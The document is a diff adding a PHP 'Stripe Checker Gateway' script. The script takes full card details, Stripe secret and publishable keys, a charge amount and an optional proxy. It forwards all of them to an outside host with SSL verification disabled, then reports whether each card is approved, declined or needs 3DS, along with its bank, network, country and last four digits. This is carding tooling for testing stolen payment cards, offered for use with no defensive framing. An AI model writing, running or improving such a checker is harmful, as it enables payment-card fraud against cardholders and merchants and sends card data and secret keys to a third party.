@@ -1,0 +1,252 @@
+<?php
+// Key Based Stripe Checker Gateway
+header('Content-Type: text/plain');
+
+$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
+$sk = $_POST['sk'] ?? $_GET['sk'] ?? '';
+$pk = $_POST['pk'] ?? $_GET['pk'] ?? '';
+$amount = $_POST['amount'] ?? $_GET['amount'] ?? '1.00';
+$key = $_POST['api_key'] ?? $_GET['api_key'] ?? 'Darkboy';
+$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';
+
+if (empty($card)) {
+    echo "ERROR: No card provided";
+    exit;
+}
+
+if (empty($sk) || empty($pk)) {
+    echo "ERROR: Stripe keys required (sk and pk)";
+    exit;
+}
+
+// Parse card format
+$parts = explode('|', $card);
+if (count($parts) < 4) {
+    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
+    exit;
+}
+
+list($cardNumber, $month, $year, $cvv) = $parts;
+
+// Build the API URL
+$apiUrl = "https://skbased.stormx.pw/skbased";
+$params = [
+    'key' => $key,
+    'sk' => $sk,
+    'pk' => $pk,
+    'amount' => $amount,
+    'cc' => "{$cardNumber}|{$month}|{$year}|{$cvv}"
+];
+
+$url = $apiUrl . '?' . http_build_query($params);
+
+// Make the request with optional proxy
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+if (!empty($proxy)) {
+    curl_setopt($ch, CURLOPT_PROXY, $proxy);
+}
+
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($httpCode !== 200) {
+    echo "DECLINED: API request failed (HTTP $httpCode)";
+    exit;
+}
+
+// Parse response
+$result = json_decode($response, true);
+
+// Check if json_decode failed
+if ($result === null && json_last_error() !== JSON_ERROR_NONE) {
+    echo "DECLINED: Invalid JSON response from API";
+    exit;
+}
+
+// Function to get detailed decline message
+function getDeclineMessage($result) {
+    $message = "";
+    
+    // Check for charge object with failure details
+    if (isset($result['charge']) && is_array($result['charge'])) {
+        if (isset($result['charge']['failure_message'])) {
+            $message = $result['charge']['failure_message'];
+        }
+        if (isset($result['charge']['failure_code'])) {
+            $code = $result['charge']['failure_code'];
+            if (empty($message)) {
+                $message = formatDeclineCode($code);
+            }
+        }
+    }
+    
+    // Check for decline code
+    if (isset($result['decline_code'])) {
+        $declineCode = $result['decline_code'];
+        $message = formatDeclineCode($declineCode) . " (" . $declineCode . ")";
+    }
+    
+    // Check for error code
+    if (isset($result['code'])) {
+        $code = $result['code'];
+        if (empty($message) || strpos($message, $code) === false) {
+            $message = formatDeclineCode($code) . " (" . $code . ")";
+        }
+    }
+    
+    // Check for direct message
+    if (isset($result['message']) && is_string($result['message'])) {
+        if (empty($message)) {
+            $message = $result['message'];
+        } elseif (strpos($message, $result['message']) === false) {
+            $message = $result['message'];
+        }
+    }
+    
+    return !empty($message) ? $message : "Transaction declined";
+}
+
+function formatDeclineCode($code) {
+    $declineMessages = [
+        'generic_decline' => 'Card declined - generic error',
+        'insufficient_funds' => 'Insufficient funds available',
+        'lost_card' => 'Card reported as lost',
+        'stolen_card' => 'Card reported as stolen',
+        'expired_card' => 'Card has expired',
+        'card_declined' => 'Card declined by issuer',
+        'incorrect_cvc' => 'Incorrect CVV code',
+        'incorrect_zip' => 'Incorrect postal code',
+        'incorrect_number' => 'Invalid card number',
+        'invalid_expiry_month' => 'Invalid expiration month',
+        'invalid_expiry_year' => 'Invalid expiration year',
+        'invalid_cvc' => 'Invalid CVV code',
+        'invalid_number' => 'Invalid card number',
+        'live_mode_test_card' => 'Test card cannot be used in live mode',
+        'pickup_card' => 'Card pickup required - contact issuer',
+        'processing_error' => 'Processing error occurred',
+        'rate_limit' => 'Rate limit exceeded - try again later',
+        'fraudulent' => 'Transaction flagged as fraudulent',
+        'do_not_honor' => 'Card issuer declined transaction',
+        'restricted_card' => 'Card restricted for this transaction',
+        'revocation_of_all_authorizations' => 'Card authorization revoked',
+        'no_such_token' => 'Invalid payment token',
+        'invalid_account' => 'Invalid merchant account',
+        'authentication_required' => 'Authentication required'
+    ];
+    
+    return $declineMessages[$code] ?? str_replace('_', ' ', ucfirst($code));
+}
+
+function extractCardInfo($result) {
+    $info = [];
+    
+    // Extract from charge object
+    if (isset($result['charge']) && is_array($result['charge'])) {
+        if (isset($result['charge']['payment_method_details']['card']['network'])) {
+            $info['card_type'] = strtoupper($result['charge']['payment_method_details']['card']['network']);
+        }
+        if (isset($result['charge']['payment_method_details']['card']['country'])) {
+            $info['country'] = $result['charge']['payment_method_details']['card']['country'];
+        }
+        if (isset($result['charge']['payment_method_details']['card']['bank'])) {
+            $info['bank'] = $result['charge']['payment_method_details']['card']['bank'];
+        }
+        if (isset($result['charge']['payment_method_details']['card']['last4'])) {
+            $info['last4'] = $result['charge']['payment_method_details']['card']['last4'];
+        }
+        if (isset($result['charge']['amount'])) {
+            $info['amount'] = $result['charge']['amount'] / 100;
+        }
+    }
+    
+    // Extract from error context if available
+    if (isset($result['error']['payment_method']['card'])) {
+        $cardData = $result['error']['payment_method']['card'];
+        if (isset($cardData['network'])) $info['card_type'] = strtoupper($cardData['network']);
+        if (isset($cardData['country'])) $info['country'] = $cardData['country'];
+        if (isset($cardData['bank'])) $info['bank'] = $cardData['bank'];
+        if (isset($cardData['last4'])) $info['last4'] = $cardData['last4'];
+    }
+    
+    return $info;
+}
+
+// Ensure $result is an array
+if (!is_array($result)) {
+    echo "DECLINED: Invalid response format from API";
+    exit;
+}
+
+// Determine transaction status
+$isApproved = false;
+$is3DS = false;
+$declineMessage = "";
+$cardInfo = [];
+
+// Check for successful charge
+if (isset($result['charge']) && isset($result['charge']['status']) && $result['charge']['status'] === 'succeeded') {
+    $isApproved = true;
+    $cardInfo = extractCardInfo($result);
+    $amount = isset($result['charge']['amount']) ? $result['charge']['amount'] / 100 : '';
+    $declineMessage = "Charge approved" . ($amount ? " for \${$amount}" : "");
+} 
+// Check for direct status
+elseif (isset($result['status'])) {
+    $status = strtoupper((string)$result['status']);
+    if ($status === 'APPROVED' || $status === 'LIVE' || $status === 'SUCCESS') {
+        $isApproved = true;
+        $declineMessage = $result['message'] ?? 'Transaction approved';
+        $cardInfo = extractCardInfo($result);
+    } elseif ($status === '3DS') {
+        $is3DS = true;
+        $declineMessage = "3DS authentication required - please verify";
+    } else {
+        $declineMessage = getDeclineMessage($result);
+        $cardInfo = extractCardInfo($result);
+    }
+}
+// Check for error/decline
+elseif (isset($result['error']) || isset($result['code']) || isset($result['decline_code'])) {
+    $declineMessage = getDeclineMessage($result);
+    $cardInfo = extractCardInfo($result);
+}
+else {
+    $declineMessage = "Invalid response from API";
+}
+
+// Format the output professionally
+if ($isApproved) {
+    echo "APPROVED: {$declineMessage}";
+    if (!empty($cardInfo)) {
+        $details = [];
+        if (isset($cardInfo['bank'])) $details[] = $cardInfo['bank'];
+        if (isset($cardInfo['card_type'])) $details[] = $cardInfo['card_type'];
+        if (isset($cardInfo['country'])) $details[] = $cardInfo['country'];
+        if (isset($cardInfo['last4'])) $details[] = "****{$cardInfo['last4']}";
+        if (!empty($details)) {
+            echo "\n[" . implode(" | ", $details) . "]";
+        }
+    }
+} elseif ($is3DS) {
+    echo "3DS REQUIRED: {$declineMessage}";
+} else {
+    echo "DECLINED: {$declineMessage}";
+    if (!empty($cardInfo)) {
+        $details = [];
+        if (isset($cardInfo['bank'])) $details[] = $cardInfo['bank'];
+        if (isset($cardInfo['card_type'])) $details[] = $cardInfo['card_type'];
+        if (isset($cardInfo['country'])) $details[] = $cardInfo['country'];
+        if (isset($cardInfo['last4'])) $details[] = "****{$cardInfo['last4']}";
+        if (!empty($details)) {
+            echo "\n[" . implode(" | ", $details) . "]";
+        }
+    }
+}
+?>
